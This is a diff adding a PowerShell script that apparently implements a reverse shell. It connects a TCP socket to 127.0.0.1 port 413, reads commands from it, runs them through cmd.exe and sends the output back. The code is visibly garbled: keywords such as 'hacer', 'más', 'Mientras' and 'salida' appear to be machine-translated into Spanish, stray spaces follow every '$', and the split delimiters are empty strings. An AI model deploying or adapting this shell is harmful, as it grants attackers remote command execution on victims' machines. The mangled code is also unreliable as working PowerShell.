@@ -1,0 +1,54 @@
+$ socket = new-object System.Net.Sockets.TcpClient ('127.0.0.1', 413);
+if ($ socket -eq $ null) {salida 1}
+$ stream = $ socket.GetStream ();
+$ writer = new-object System.IO.StreamWriter ($ stream);
+$ buffer = nuevo objeto System.Byte [] 1024;
+$ encoding = new-object System.Text.AsciiEncoding;
+hacer
+{
+	$ writer.Flush ();
+	$ leer = $ nulo;
+	$ res = ""
+	while ($ stream.DataAvailable -or $ read -eq $ null) {
+		$ read = $ stream.Read ($ buffer, 0, 1024)
+	}
+	$ out = $ encoding.GetString ($ buffer, 0, $ read) .Replace ("` r`n "," "). Reemplazar (" `n", "");
+	if (! $ out.equals ("salida")) {
+		$ args = "";
+		if ($ out.IndexOf ('') -gt -1) {
+			$ args = $ out.substring ($ out.IndexOf ('') +1);
+			$ out = $ out.substring (0, $ out.IndexOf (''));
+			if ($ args.split ('') .length -gt 1) {
+                $ pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $ pinfo.FileName = "cmd.exe"
+                $ pinfo.RedirectStandardError = $ true
+                $ pinfo.RedirectStandardOutput = $ true
+                $ pinfo.UseShellExecute = $ false
+                $ pinfo.Arguments = "/ c $ out $ args"
+                $ p = New-Object System.Diagnostics.Process
+                $ p.StartInfo = $ pinfo
+                $ p.Start () | Nulo
+                $ p.WaitForExit ()
+                $ stdout = $ p.StandardOutput.ReadToEnd ()
+                $ stderr = $ p.StandardError.ReadToEnd ()
+                if ($ p.ExitCode -ne 0) {
+                    $ res = $ stderr
+                } más {
+                    $ res = $ stdout
+                }
+			}
+			más{
+				$ res = (& "$ out" "$ args") | fuera de cadena;
+			}
+		}
+		más{
+			$ res = (& "$ out") | fuera de cadena;
+		}
+		if ($ res -ne $ null) {
+        $ writer.WriteLine ($ res)
+    }
+	}
+} Mientras (! $ Out.equals ("salir"))
+$ escritor.close ();
+$ socket.close ();
+$ stream.Dispose ()
